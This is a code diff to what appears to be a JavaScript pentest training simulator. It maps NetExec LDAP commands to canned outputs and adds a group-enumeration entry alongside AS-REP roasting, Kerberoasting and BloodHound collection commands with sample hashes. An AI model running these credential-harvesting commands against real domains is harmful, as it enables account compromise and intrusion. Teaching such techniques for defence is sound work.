@@ -105,6 +105,7 @@ var sample = {
 
   'ldap-auth':         { cmd: "nxc ldap 10.10.10.10 -u jdoe -p Winter2021", ok: L + '[+] corp.local\\jdoe:Winter2021', neg: L + '[-] corp.local\\jdoe:Winter2021 STATUS_LOGON_FAILURE' },
   'ldap-users':        { cmd: "nxc ldap 10.10.10.10 -u jdoe -p Winter2021 --users", ok: L + '[+] corp.local\\jdoe:Winter2021\n' + L + '-Username-     -Last PW Set-\n' + L + 'administrator  2021-01-02\n' + L + 'svc-sql        2020-05-05', neg: L + '[-] STATUS_ACCESS_DENIED' },
+  'ldap-groups':       { cmd: "nxc ldap 10.10.10.10 -u jdoe -p Winter2021 --groups", ok: L + 'Domain Admins membercount: 2\n' + L + 'Enterprise Admins membercount: 1', neg: L + '[-] STATUS_ACCESS_DENIED' },
   'ldap-asreproast':   { cmd: "nxc ldap 10.10.10.10 -u jdoe -p Winter2021 --asreproast o.txt", ok: L + '$krb5asrep$23$svc-x@CORP.LOCAL:abcd1234$ef567890abcdef1234567890abcdef', neg: L + '[-] no AS-REP roastable users' },
   'ldap-kerberoasting':{ cmd: "nxc ldap 10.10.10.10 -u jdoe -p Winter2021 --kerberoasting o.txt", ok: L + '$krb5tgs$23$*svc-sql$CORP.LOCAL$MSSQL/sql*$abcdef1234567890abcdef1234567890', neg: L + '[-] no kerberoastable users' },
   'ldap-bloodhound':   { cmd: "nxc ldap 10.10.10.10 -u jdoe -p Winter2021 --bloodhound -c All --dns-server 10.10.10.10", ok: L + '[+] corp.local\\jdoe:Winter2021\n' + L + 'Compressing output into /tmp/corp.local_bloodhound.zip', neg: L + '[-] bloodhound collection failed' },
